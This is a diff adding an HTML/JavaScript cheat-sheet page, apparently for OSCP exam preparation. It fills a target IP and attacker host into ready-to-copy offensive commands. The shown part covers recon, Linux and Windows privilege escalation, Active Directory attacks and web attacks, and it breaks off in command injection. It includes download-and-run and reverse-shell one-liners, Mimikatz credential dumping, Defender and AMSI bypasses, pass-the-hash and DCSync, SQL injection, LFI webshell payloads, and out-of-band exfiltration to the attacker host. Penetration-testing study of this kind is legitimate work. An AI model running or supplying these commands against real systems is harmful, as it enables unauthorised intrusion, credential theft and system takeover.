@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>OSCP Command Reference</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d1117;--s1:#161b22;--s2:#21262d;--s3:#30363d;
+  --red:#e53935;--blue:#58a6ff;--green:#3fb950;--yellow:#d29922;
+  --orange:#f0883e;--purple:#bc8cff;--cyan:#79c0ff;
+  --text:#e6edf3;--dim:#8b949e;--muted:#6e7681;--border:#30363d;
+  --r:6px;
+}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:14px}
+button{cursor:pointer;border:none;font-family:inherit;transition:all .12s}
+input,textarea,select{font-family:inherit;background:var(--s2);border:1px solid var(--border);color:var(--text);border-radius:var(--r);padding:.35rem .6rem;outline:none}
+input:focus,textarea:focus,select:focus{border-color:var(--blue)}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--s3);border-radius:3px}
+code{font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.82rem}
+
+/* TOP BAR */
+.topbar{background:var(--s1);border-bottom:1px solid var(--border);padding:.55rem 1rem;display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;flex-shrink:0}
+.logo{font-weight:800;font-size:1.05rem;color:var(--red);letter-spacing:1px;white-space:nowrap}
+.logo span{color:var(--blue)}
+.field-group{display:flex;align-items:center;gap:.35rem}
+.field-group label{font-size:.72rem;color:var(--muted);white-space:nowrap}
+.field-group input{width:140px;font-size:.82rem}
+.field-group input.short{width:72px}
+.search-wrap{flex:1;min-width:160px}
+.search-wrap input{width:100%;font-size:.82rem}
+.clear-btn{background:var(--s3);color:var(--dim);border-radius:var(--r);padding:.35rem .65rem;font-size:.78rem}
+.clear-btn:hover{color:var(--text)}
+
+/* LAYOUT */
+.body{display:flex;flex:1;overflow:hidden}
+
+/* SIDEBAR */
+.sidebar{width:185px;background:var(--s1);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;padding:.5rem}
+.cat-btn{width:100%;text-align:left;padding:.5rem .7rem;border-radius:var(--r);background:transparent;color:var(--dim);font-size:.83rem;margin-bottom:.15rem;display:flex;align-items:center;gap:.5rem;border:1px solid transparent}
+.cat-btn:hover{background:var(--s2);color:var(--text)}
+.cat-btn.active{background:var(--s2);color:var(--text);border-color:var(--border)}
+.cat-btn .icon{font-size:1rem;width:20px;text-align:center}
+.cat-btn .count{margin-left:auto;background:var(--s3);border-radius:10px;padding:0 .4rem;font-size:.68rem;color:var(--muted)}
+.sidebar-sep{font-size:.65rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;padding:.6rem .5rem .3rem}
+
+/* MAIN */
+.main{flex:1;overflow-y:auto;padding:1rem 1.2rem}
+
+/* SECTION */
+.section{margin-bottom:1.5rem}
+.section-title{font-size:.8rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:.5rem;padding-bottom:.35rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.5rem}
+.section-title .stag{background:var(--s2);border-radius:4px;padding:.05rem .4rem;font-size:.65rem;color:var(--dim)}
+
+/* COMMAND ROW */
+.cmd-row{display:flex;align-items:flex-start;gap:.5rem;margin-bottom:.35rem;position:relative}
+.cmd-label{font-size:.72rem;color:var(--muted);white-space:nowrap;padding-top:.45rem;min-width:130px;max-width:130px;overflow:hidden;text-overflow:ellipsis}
+.cmd-box{flex:1;background:var(--s2);border:1px solid var(--border);border-radius:var(--r);padding:.4rem .6rem;font-size:.8rem;font-family:'Cascadia Code','Fira Code',Consolas,monospace;word-break:break-all;line-height:1.5;position:relative;cursor:pointer;transition:border-color .12s}
+.cmd-box:hover{border-color:var(--blue)}
+.cmd-box .hi-ip{color:var(--orange)}
+.cmd-box .hi-port{color:var(--yellow)}
+.cmd-box .hi-lhost{color:var(--cyan)}
+.cmd-box .hi-lport{color:var(--purple)}
+.cmd-box .hi-kw{color:var(--green)}
+.copy-btn{background:var(--s3);color:var(--dim);border-radius:var(--r);padding:.35rem .55rem;font-size:.75rem;white-space:nowrap;flex-shrink:0}
+.copy-btn:hover{background:var(--blue);color:#fff}
+.copy-btn.copied{background:var(--green);color:#fff}
+
+/* NOTE */
+.note-row{display:flex;align-items:flex-start;gap:.5rem;margin-top:.25rem;margin-bottom:.5rem}
+.note-area{flex:1;background:transparent;border:1px solid transparent;border-radius:var(--r);padding:.3rem .5rem;font-size:.78rem;color:var(--dim);resize:none;min-height:28px;line-height:1.4}
+.note-area:focus{border-color:var(--border);background:var(--s2);color:var(--text)}
+.note-area::placeholder{color:var(--muted)}
+
+/* CATEGORY HEADER */
+.cat-header{display:flex;align-items:center;gap:.75rem;margin-bottom:1rem}
+.cat-icon{font-size:1.5rem}
+.cat-name{font-size:1.1rem;font-weight:700}
+.cat-desc{font-size:.8rem;color:var(--dim);margin-top:.1rem}
+
+/* SEARCH HIGHLIGHT */
+.cmd-box mark{background:#3b4a1a;color:#d2e56a;border-radius:2px}
+
+/* EMPTY */
+.empty{text-align:center;padding:3rem;color:var(--muted);font-size:.9rem}
+.empty .big{font-size:2rem;margin-bottom:.5rem}
+
+/* TAG BADGES */
+.tag{display:inline-block;border-radius:3px;padding:.05rem .4rem;font-size:.68rem;font-weight:700;margin-right:.3rem}
+.tag.crit{background:#7f1d1d;color:#fca5a5}
+.tag.high{background:#7c2d12;color:#fdba74}
+.tag.info{background:#1e3a5f;color:#93c5fd}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">OSCP<span>REF</span></div>
+
+  <div class="field-group">
+    <label>TARGET IP</label>
+    <input id="ip" type="text" placeholder="10.10.10.10" oninput="render()"/>
+  </div>
+  <div class="field-group">
+    <label>PORT</label>
+    <input id="port" class="short" type="text" placeholder="80" oninput="render()"/>
+  </div>
+  <div class="field-group">
+    <label>LHOST</label>
+    <input id="lhost" type="text" placeholder="10.10.14.1" oninput="render()"/>
+  </div>
+  <div class="field-group">
+    <label>LPORT</label>
+    <input id="lport" class="short" type="text" placeholder="4444" oninput="render()"/>
+  </div>
+
+  <div class="search-wrap">
+    <input id="search" type="text" placeholder="&#128269; Search commands..." oninput="render()"/>
+  </div>
+  <button class="clear-btn" onclick="clearSearch()">Clear</button>
+</div>
+
+<div class="body">
+  <div class="sidebar" id="sidebar"></div>
+  <div class="main" id="main"></div>
+</div>
+
+<script>
+// ================================================================
+// DATA — All OSCP Commands
+// ================================================================
+const CATS = [
+  // ---------------------------------------------------------------
+  {
+    id:'recon', icon:'🔍', label:'Initial Recon', desc:'First things to run on any target',
+    sections:[
+      {
+        title:'Nmap', tag:'always',
+        cmds:[
+          {l:'Quick top ports',       c:'nmap -sV -sC --top-ports 1000 -oN nmap_quick.txt {IP}'},
+          {l:'Full all ports',        c:'nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt {IP}'},
+          {l:'UDP top 100',           c:'sudo nmap -sU --top-ports 100 {IP}'},
+          {l:'Single port scripts',   c:'nmap -p {PORT} -sV --script=vuln,banner,default {IP}'},
+          {l:'OS detection',          c:'sudo nmap -O -sV {IP}'},
+          {l:'NSE all safe scripts',  c:'nmap -p {PORT} --script=safe {IP}'},
+          {l:'Export all formats',    c:'nmap -sV -sC -p- --min-rate 5000 -oA nmap_all {IP}'},
+        ]
+      },
+      {
+        title:'Web Discovery (port found)',
+        cmds:[
+          {l:'Whatweb',              c:'whatweb http://{IP}:{PORT}'},
+          {l:'curl headers',         c:'curl -I http://{IP}:{PORT}'},
+          {l:'Nikto scan',           c:'nikto -h http://{IP}:{PORT}'},
+          {l:'Check HTTPS too',      c:'curl -k -I https://{IP}:{PORT}'},
+        ]
+      },
+      {
+        title:'Quick Checks',
+        cmds:[
+          {l:'NetBIOS lookup',        c:'nbtscan {IP}'},
+          {l:'DNS lookup',            c:'host {IP} && nslookup {IP}'},
+          {l:'Reverse DNS',           c:'dig -x {IP}'},
+          {l:'Zone transfer',         c:'dig axfr @{IP} domain.htb'},
+          {l:'Ping sweep (local)',    c:'nmap -sn 10.10.10.0/24'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'linux', icon:'🐧', label:'Linux', desc:'Linux enumeration and privilege escalation',
+    sections:[
+      {
+        title:'Service Enum (from Kali)',
+        cmds:[
+          {l:'Gobuster dirs',         c:'gobuster dir -u http://{IP}:{PORT} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -o gobuster.txt'},
+          {l:'Gobuster (raft)',        c:'gobuster dir -u http://{IP}:{PORT} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'},
+          {l:'Feroxbuster',           c:'feroxbuster -u http://{IP}:{PORT} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt'},
+          {l:'FTP banner grab',       c:'nc -nv {IP} 21'},
+          {l:'SSH version',           c:'ssh -V; nc -nv {IP} 22'},
+          {l:'SMTP enum users',       c:'nc -nv {IP} 25\nEHLO test\nVRFY root\nVRFY admin'},
+        ]
+      },
+      {
+        title:'Post-Shell: Basic Enum',
+        cmds:[
+          {l:'Who am I',              c:'id && whoami && hostname && uname -a'},
+          {l:'Network info',          c:'ip a; ip route; netstat -tulpn'},
+          {l:'Users',                 c:'cat /etc/passwd | grep -v nologin | grep -v false'},
+          {l:'Readable shadow',       c:'cat /etc/shadow'},
+          {l:'Current groups',        c:'groups'},
+          {l:'Logged in users',       c:'w; who; last'},
+          {l:'Running processes',     c:'ps aux'},
+          {l:'Open files/ports',      c:'ss -tulpn; netstat -tulpn'},
+          {l:'Environment vars',      c:'env; printenv'},
+          {l:'Bash history',          c:'cat ~/.bash_history; cat /root/.bash_history 2>/dev/null'},
+          {l:'Crontabs',              c:'crontab -l 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.*'},
+          {l:'Installed packages',    c:'dpkg -l 2>/dev/null; rpm -qa 2>/dev/null'},
+          {l:'Writable dirs',         c:'find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys'},
+          {l:'World-writable files',  c:'find / -perm -0002 -type f 2>/dev/null | grep -v proc'},
+          {l:'Recent modified files', c:'find / -mmin -10 -type f 2>/dev/null | grep -v proc'},
+          {l:'Config files w/ pass',  c:"grep -r 'password\\|passwd\\|secret\\|key' /etc 2>/dev/null | grep -v '#'"},
+          {l:'SSH keys',              c:'find / -name "id_rsa" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null'},
+          {l:'Home dirs',             c:'ls -la /home/; ls -la /root/ 2>/dev/null'},
+          {l:'Interesting files',     c:'find / -name "*.txt" -o -name "*.conf" -o -name "*.log" 2>/dev/null | grep -v proc | head -30'},
+        ]
+      },
+      {
+        title:'Privilege Escalation',
+        cmds:[
+          {l:'sudo perms',            c:'sudo -l'},
+          {l:'sudo -u#-1 (CVE-2019-14287)', c:'sudo -u#-1 /bin/bash'},
+          {l:'SUID binaries',         c:'find / -perm -u=s -type f 2>/dev/null'},
+          {l:'SGID binaries',         c:'find / -perm -g=s -type f 2>/dev/null'},
+          {l:'Capabilities',          c:'/usr/sbin/getcap -r / 2>/dev/null'},
+          {l:'Writable /etc/passwd',  c:'ls -la /etc/passwd; openssl passwd -1 hacked; echo "root2:HASH:0:0::/root:/bin/bash" >> /etc/passwd'},
+          {l:'PATH injection check',  c:'echo $PATH; find / -writable 2>/dev/null | grep -E "^(/usr/local/bin|/usr/bin|/bin)"'},
+          {l:'NFS no_root_squash',    c:'cat /etc/exports; showmount -e {IP}'},
+          {l:'Kernel version',        c:'uname -r; cat /proc/version'},
+          {l:'OS version',            c:'cat /etc/os-release; cat /etc/issue'},
+          {l:'LinPEAS download+run',  c:'curl -L http://{LHOST}:8000/linpeas.sh | sh'},
+          {l:'LinPEAS wget+run',      c:'wget http://{LHOST}:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out'},
+          {l:'linux-exploit-suggester',c:'wget http://{LHOST}:8000/les.sh -O /tmp/les.sh && bash /tmp/les.sh'},
+          {l:'pspy (process spy)',     c:'wget http://{LHOST}:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy'},
+          {l:'Check /etc/crontab',    c:'cat /etc/crontab && ls -la /etc/cron.d/'},
+          {l:'Check cron writable',   c:'ls -la /etc/cron.d; ls -la /etc/cron.daily; ls -la /etc/cron.weekly'},
+        ]
+      },
+      {
+        title:'File Transfer (to victim)',
+        cmds:[
+          {l:'Python3 HTTP server (Kali)', c:'python3 -m http.server 8000'},
+          {l:'wget from victim',      c:'wget http://{LHOST}:8000/FILE -O /tmp/FILE'},
+          {l:'curl from victim',      c:'curl http://{LHOST}:8000/FILE -o /tmp/FILE'},
+          {l:'SCP to victim',         c:'scp /path/to/file user@{IP}:/tmp/'},
+          {l:'Netcat send (Kali)',     c:'nc -lvnp 4444 < file'},
+          {l:'Netcat recv (victim)',   c:'nc {LHOST} 4444 > /tmp/file'},
+          {l:'Base64 transfer',       c:'# Kali: base64 file | xclip\n# Victim: echo BASE64 | base64 -d > file'},
+        ]
+      },
+      {
+        title:'Shell Upgrade',
+        cmds:[
+          {l:'Python pty',            c:'python3 -c \'import pty;pty.spawn("/bin/bash")\''},
+          {l:'Script trick',          c:'script /dev/null -c bash'},
+          {l:'Full interactive tty',  c:'# 1. python3 -c \'import pty;pty.spawn("/bin/bash")\'\n# 2. Ctrl+Z\n# 3. stty raw -echo; fg\n# 4. export TERM=xterm\n# 5. stty rows 38 cols 160'},
+          {l:'Socat (Kali listen)',    c:'socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}'},
+          {l:'Socat (victim)',         c:'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'windows', icon:'🪟', label:'Windows', desc:'Windows enumeration and privilege escalation',
+    sections:[
+      {
+        title:'Basic Enumeration',
+        cmds:[
+          {l:'Who am I + privs',      c:'whoami /all'},
+          {l:'All users',             c:'net user'},
+          {l:'Local admins',          c:'net localgroup administrators'},
+          {l:'Domain info (if AD)',    c:'net user /domain; net group /domain'},
+          {l:'System info',           c:'systeminfo'},
+          {l:'OS + arch',             c:'wmic os get caption,version,osarchitecture'},
+          {l:'IP config',             c:'ipconfig /all'},
+          {l:'Routing table',         c:'route print'},
+          {l:'Open ports',            c:'netstat -ano'},
+          {l:'Running services',      c:'sc query; net start'},
+          {l:'Running processes',     c:'tasklist /v; wmic process list full'},
+          {l:'Installed software',    c:'wmic product get name,version'},
+          {l:'Scheduled tasks',       c:'schtasks /query /fo LIST /v'},
+          {l:'Startup items',         c:'wmic startup list full'},
+          {l:'Env variables',         c:'set'},
+          {l:'PowerShell history',    c:'type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'},
+          {l:'Interesting files',     c:'dir /s /b C:\\*password* C:\\*pass* C:\\*cred* 2>nul'},
+          {l:'Wifi passwords',        c:'netsh wlan show profile; netsh wlan show profile "SSID" key=clear'},
+          {l:'Cmdkey saved creds',    c:'cmdkey /list'},
+          {l:'Reg: AutoLogon creds',  c:'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'},
+        ]
+      },
+      {
+        title:'Privilege Escalation',
+        cmds:[
+          {l:'WinPEAS (download+run)',c:'certutil -urlcache -split -f "http://{LHOST}:8000/winPEASx64.exe" C:\\Windows\\Temp\\winpeas.exe && C:\\Windows\\Temp\\winpeas.exe'},
+          {l:'PowerUp',              c:'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:8000/PowerUp.ps1\'); Invoke-AllChecks"'},
+          {l:'AlwaysInstallElevated', c:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer'},
+          {l:'MSI exploit (if above=1)',c:'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi'},
+          {l:'Unquoted service paths', c:'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"'},
+          {l:'Weak service perms',    c:'.\\accesschk.exe -uwcqv "Authenticated Users" * /accepteula\n.\\accesschk.exe -uwcqv "Everyone" * /accepteula'},
+          {l:'Token impersonation',   c:'# Check: whoami /priv (look for SeImpersonatePrivilege)\n# Use: PrintSpoofer, GodPotato, JuicyPotato'},
+          {l:'PrintSpoofer',          c:'PrintSpoofer.exe -i -c cmd'},
+          {l:'GodPotato',             c:'GodPotato.exe -cmd "cmd /c whoami"'},
+          {l:'JuicyPotato (older)',   c:'JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}'},
+          {l:'RunAs saved creds',     c:'runas /savecred /user:administrator cmd.exe'},
+          {l:'DLL hijacking path',    c:'# Find writable dirs in PATH\n$env:PATH -split \';\''},
+          {l:'Pass tickets (Mimikatz)',c:'sekurlsa::logonpasswords\nsekurlsa::wdigest\nlsadump::sam\ntoken::elevate\nvault::cred /patch'},
+          {l:'Mimikatz download+run', c:'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz"'},
+        ]
+      },
+      {
+        title:'File Transfer',
+        cmds:[
+          {l:'Certutil download',     c:'certutil -urlcache -split -f "http://{LHOST}:8000/nc.exe" C:\\Windows\\Temp\\nc.exe'},
+          {l:'PowerShell download',   c:'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://{LHOST}:8000/file.exe\',\'C:\\Windows\\Temp\\file.exe\')"'},
+          {l:'IWR (PS alias)',         c:'iwr -uri http://{LHOST}:8000/file.exe -outfile C:\\Windows\\Temp\\file.exe'},
+          {l:'Bitsadmin',             c:'bitsadmin /transfer job http://{LHOST}:8000/nc.exe C:\\Windows\\Temp\\nc.exe'},
+          {l:'SMB server (Kali)',      c:'impacket-smbserver share . -smb2support -username user -password pass'},
+          {l:'SMB copy (victim)',      c:'copy \\\\{LHOST}\\share\\file.exe C:\\Windows\\Temp\\'},
+          {l:'SMB net use',           c:'net use Z: \\\\{LHOST}\\share /user:user pass && copy Z:\\file.exe .'},
+          {l:'Base64 download',       c:'# Kali: base64 file.exe | xclip -sel clip\n# Victim PS: [IO.File]::WriteAllBytes("file.exe",[Convert]::FromBase64String("BASE64"))'},
+        ]
+      },
+      {
+        title:'AV Bypass (basic)',
+        cmds:[
+          {l:'Disable Defender (admin)',c:'Set-MpPreference -DisableRealtimeMonitoring $true'},
+          {l:'Exclusion path',        c:'Set-MpPreference -ExclusionPath C:\\Windows\\Temp'},
+          {l:'AMSI bypass (PS)',       c:'[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'ad', icon:'🏢', label:'Active Directory', desc:'AD enumeration and attacks',
+    sections:[
+      {
+        title:'Unauthenticated Enum (from Kali)',
+        cmds:[
+          {l:'SMB null session',      c:'crackmapexec smb {IP} -u \'\' -p \'\''},
+          {l:'SMB guest',             c:'crackmapexec smb {IP} -u \'guest\' -p \'\''},
+          {l:'SMB enum shares',       c:'smbclient -L //{IP} -N'},
+          {l:'enum4linux-ng',         c:'enum4linux-ng -A {IP}'},
+          {l:'LDAP anonymous',        c:'ldapsearch -x -H ldap://{IP} -s base'},
+          {l:'LDAP domain enum',      c:'ldapsearch -x -H ldap://{IP} -b "DC=domain,DC=htb"'},
+          {l:'RPC null',              c:'rpcclient -U "" -N {IP}'},
+          {l:'RPC enumdomusers',      c:'rpcclient -U "" -N {IP} -c enumdomusers'},
+          {l:'Kerbrute user enum',    c:'kerbrute userenum -d domain.htb --dc {IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'},
+          {l:'LDAP user dump',        c:"ldapsearch -x -H ldap://{IP} -b 'DC=domain,DC=htb' '(objectClass=user)' sAMAccountName"},
+        ]
+      },
+      {
+        title:'Authenticated Enum',
+        cmds:[
+          {l:'CrackMapExec full',     c:'crackmapexec smb {IP} -u user -p pass --users --groups --shares'},
+          {l:'CrackMapExec loggedon', c:'crackmapexec smb {IP} -u user -p pass --loggedon-users'},
+          {l:'BloodHound (Python)',    c:'bloodhound-python -d domain.htb -u user -p pass -c All -ns {IP} --zip'},
+          {l:'BloodHound (Windows)',   c:'.\\SharpHound.exe -c All --zipfilename bh.zip'},
+          {l:'PowerView whoami',      c:'powershell -ep bypass -c "Import-Module .\\PowerView.ps1; Get-NetUser | select name,description"'},
+          {l:'PowerView groups',      c:'Import-Module .\\PowerView.ps1; Get-NetGroup'},
+          {l:'PowerView DC',          c:'Import-Module .\\PowerView.ps1; Get-NetDomainController'},
+          {l:'LDAP auth dump',        c:"ldapsearch -x -H ldap://{IP} -D 'user@domain.htb' -w 'pass' -b 'DC=domain,DC=htb' '(objectClass=user)'"},
+          {l:'RPC with creds',        c:'rpcclient -U "domain/user%pass" {IP}'},
+          {l:'RPC enum all',          c:'rpcclient -U "user%pass" {IP} -c "enumdomusers;enumdomgroups;enumdomains"'},
+        ]
+      },
+      {
+        title:'AS-REP Roasting',
+        cmds:[
+          {l:'GetNPUsers (no creds)', c:'impacket-GetNPUsers domain.htb/ -usersfile users.txt -dc-ip {IP} -format hashcat -outputfile asrep.hash'},
+          {l:'GetNPUsers (with creds)',c:'impacket-GetNPUsers domain.htb/user:pass -dc-ip {IP} -request -format hashcat'},
+          {l:'Crack ASREP hash',      c:'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt'},
+          {l:'John the Ripper',       c:'john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt'},
+        ]
+      },
+      {
+        title:'Kerberoasting',
+        cmds:[
+          {l:'GetUserSPNs',           c:'impacket-GetUserSPNs domain.htb/user:pass -dc-ip {IP} -request -outputfile kerberoast.hash'},
+          {l:'Rubeus (Windows)',       c:'.\\Rubeus.exe kerberoast /outfile:hashes.txt'},
+          {l:'Crack TGS hash',        c:'hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt'},
+        ]
+      },
+      {
+        title:'Password Spraying',
+        cmds:[
+          {l:'CrackMapExec SMB',      c:'crackmapexec smb {IP} -u users.txt -p passwords.txt --continue-on-success'},
+          {l:'CrackMapExec WinRM',    c:'crackmapexec winrm {IP} -u users.txt -p passwords.txt'},
+          {l:'Kerbrute spray',        c:'kerbrute passwordspray -d domain.htb --dc {IP} users.txt Password123!'},
+        ]
+      },
+      {
+        title:'Pass-the-Hash / Ticket',
+        cmds:[
+          {l:'PsExec PTH',            c:'impacket-psexec domain.htb/administrator@{IP} -hashes :NTLM_HASH'},
+          {l:'WMIExec PTH',           c:'impacket-wmiexec domain.htb/administrator@{IP} -hashes :NTLM_HASH'},
+          {l:'SMBExec PTH',           c:'impacket-smbexec domain.htb/administrator@{IP} -hashes :NTLM_HASH'},
+          {l:'CrackMapExec PTH',      c:'crackmapexec smb {IP} -u administrator -H NTLM_HASH --local-auth'},
+          {l:'Evil-WinRM PTH',        c:'evil-winrm -i {IP} -u administrator -H NTLM_HASH'},
+          {l:'Evil-WinRM creds',      c:'evil-winrm -i {IP} -u user -p password'},
+          {l:'Pass-the-Ticket (PS)',   c:'.\\Rubeus.exe asktgt /user:user /rc4:NTLM /ptt'},
+          {l:'Overpass-the-Hash',     c:'.\\Rubeus.exe asktgt /user:user /rc4:NTLM /domain:domain.htb /dc:{IP} /ptt'},
+        ]
+      },
+      {
+        title:'DCSync / Credential Dump',
+        cmds:[
+          {l:'secretsdump (remote)',   c:'impacket-secretsdump domain.htb/user:pass@{IP}'},
+          {l:'secretsdump (PTH)',      c:'impacket-secretsdump domain.htb/administrator@{IP} -hashes :NTLM_HASH'},
+          {l:'Mimikatz DCSync',       c:'lsadump::dcsync /domain:domain.htb /user:administrator'},
+          {l:'Dump SAM (local admin)', c:'impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY'},
+          {l:'Crack NTLM hash',       c:'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt'},
+        ]
+      },
+      {
+        title:'ACL / Delegation Attacks',
+        cmds:[
+          {l:'ForceChangePassword',   c:'Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString \'NewPass123!\' -AsPlainText -Force)'},
+          {l:'GenericAll/Write abuse', c:'# Add to group:\nAdd-DomainGroupMember -Identity "Domain Admins" -Members attacker'},
+          {l:'Unconstrained deleg',   c:'.\\Rubeus.exe monitor /interval:5 /nowrap'},
+          {l:'Constrained deleg S4U', c:'.\\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/{IP} /ptt'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'web', icon:'🕷️', label:'Web', desc:'Web application penetration testing',
+    sections:[
+      {
+        title:'Enumeration',
+        cmds:[
+          {l:'Gobuster dirs',         c:'gobuster dir -u http://{IP}:{PORT} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip -t 50'},
+          {l:'Gobuster vhosts',       c:'gobuster vhost -u http://{IP} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain'},
+          {l:'Feroxbuster recursive', c:'feroxbuster -u http://{IP}:{PORT} -r -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'},
+          {l:'ffuf dirs',             c:'ffuf -u http://{IP}:{PORT}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302'},
+          {l:'ffuf vhosts',           c:'ffuf -H "Host: FUZZ.domain.htb" -u http://{IP} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 000'},
+          {l:'ffuf params',           c:'ffuf -u "http://{IP}:{PORT}/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt'},
+          {l:'Nikto',                 c:'nikto -h http://{IP}:{PORT} -output nikto.txt'},
+          {l:'Whatweb',               c:'whatweb http://{IP}:{PORT} -v'},
+          {l:'Spider with wget',      c:'wget -r -l 2 http://{IP}:{PORT}'},
+        ]
+      },
+      {
+        title:'SQL Injection',
+        cmds:[
+          {l:'SQLmap GET param',      c:"sqlmap -u 'http://{IP}:{PORT}/page?id=1' --dbs --batch"},
+          {l:'SQLmap POST',           c:"sqlmap -u 'http://{IP}:{PORT}/login' --data='user=admin&pass=test' --dbs --batch"},
+          {l:'SQLmap cookies',        c:"sqlmap -u 'http://{IP}:{PORT}/page' --cookie='PHPSESSID=abc' --dbs --batch"},
+          {l:'SQLmap dump all',       c:"sqlmap -u 'http://{IP}:{PORT}/page?id=1' --dump-all --batch"},
+          {l:'SQLmap OS shell',       c:"sqlmap -u 'http://{IP}:{PORT}/page?id=1' --os-shell --batch"},
+          {l:'SQLmap req file',       c:'sqlmap -r request.txt --dbs --batch'},
+          {l:'Manual: error based',   c:"' OR 1=1-- -\n' OR 1=1#\n' AND SLEEP(5)-- -\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -"},
+          {l:'Manual: blind boolean', c:"' AND 1=1-- -\n' AND 1=2-- -\n' AND SUBSTRING(username,1,1)='a'-- -"},
+          {l:'MSSQL xp_cmdshell',     c:"'; EXEC xp_cmdshell('whoami');-- -\n'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;-- -"},
+        ]
+      },
+      {
+        title:'LFI / Path Traversal',
+        cmds:[
+          {l:'Basic LFI',             c:'http://{IP}:{PORT}/page?file=../../../../etc/passwd\nhttp://{IP}:{PORT}/page?file=../../../etc/passwd\nhttp://{IP}:{PORT}/page?file=/etc/passwd'},
+          {l:'LFI null byte (PHP<5.3)',c:'http://{IP}:{PORT}/page?file=../../../../etc/passwd%00'},
+          {l:'LFI PHP filter b64',    c:'http://{IP}:{PORT}/page?file=php://filter/convert.base64-encode/resource=index.php'},
+          {l:'LFI filter chain RCE',  c:'# Use: https://github.com/synacktiv/php_filter_chain_generator'},
+          {l:'LFI data:// RCE',       c:"http://{IP}:{PORT}/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"},
+          {l:'LFI log poisoning',     c:'# 1. Poison: curl -A "<?php system($_GET[\'cmd\']); ?>" http://{IP}\n# 2. Include: ?file=../../../../var/log/apache2/access.log&cmd=id'},
+          {l:'LFI /proc/self/environ', c:'http://{IP}:{PORT}/page?file=/proc/self/environ'},
+          {l:'LFI SSH log',           c:'# ssh "<?php system($_GET[\'cmd\']); ?>"@{IP}\n# ?file=../../../../var/log/auth.log&cmd=id'},
+          {l:'Windows LFI',           c:'http://{IP}:{PORT}/page?file=../../../../windows/system32/drivers/etc/hosts\n..\\..\\..\\windows\\win.ini'},
+        ]
+      },
+      {
+        title:'Command Injection',
+        cmds:[
+          {l:'Basic payloads',        c:'; id\n| id\n`id`\n$(id)\n; id #\n|| id\n&& id'},
+          {l:'Blind (OOB)',           c:'; curl http://{LHOST}:8000/$(id)\n; ping -c 1 {LHOST}'},
